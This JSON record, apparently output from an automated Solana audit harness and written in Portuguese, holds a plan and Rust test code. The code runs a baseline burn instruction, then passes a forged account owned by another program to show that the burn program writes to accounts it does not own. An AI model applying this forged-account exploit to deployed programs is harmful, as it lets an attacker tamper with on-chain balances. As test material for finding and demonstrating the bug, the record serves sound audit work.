{
  "plan": "O programa `burn` (Pinocchio) recebe `accounts[0]` como `AccountInfo` generica e le/escreve os bytes 40..56 sem verificar o dono. O baseline usa uma conta legitima com dono = program_id e dados com supply/balance iniciais, chamando `burn` com amount pequeno e verificando que os bytes 40..56 sao decrementados. O ataque repete a mesma instrucao, mas substitui `accounts[0]` por uma conta forjada cujo dono e outro programa (ex.: System Program) e cujos dados sao controlados pelo atacante. O efeito medido e que a conta forjada teve seus bytes 40..56 sobrescritos pelo programa, provando que uma conta de dono estrangeiro foi aceita e modificada.",
  "scenario": "let program_id = env.program_id;

// Conta legitima: dono = program_id, dados com supply=1000, balance=500 nos offsets 40 e 48
let mut legit_data = vec![0u8; 64];
legit_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let legit_account = account(&program_id, &legit_data, None);

// Instrucao burn: discriminador IX_BURN=1 + amount u64 LE
let amount: u64 = 100;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: uso legitimo com a conta do programa
let metas = vec![AccountMeta::new(legit_account_key, false)];
let ix = env.raw_ix(&ix_data, metas);
let contas = vec![(legit_account_key, legit_account)];
let r = env.baseline("burn legitimo", &ix, &contas);

// Ataque: conta forjada com dono = System Program (diferente do program_id)
let mut forged_data = vec![0u8; 64];
forged_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&500u64.to_le_bytes());
let forged_account = account(&solana_sdk::system_program::id(), &forged_data, None);
let forged_key = Pubkey::new_unique();

let metas_attack = vec![AccountMeta::new(forged_key, false)];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![(forged_key, forged_account)];
let r_attack = env.attack("burn com conta forjada de outro dono", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let after_forged = after(&r_attack, &forged_key);
    let new_supply = read_u64(after_forged.data(), 40);
    let new_balance = read_u64(after_forged.data(), 48);
    env.effect("conta forjada de outro dono foi modificada pelo programa", new_supply == 900 && new_balance == 400);
}"
}

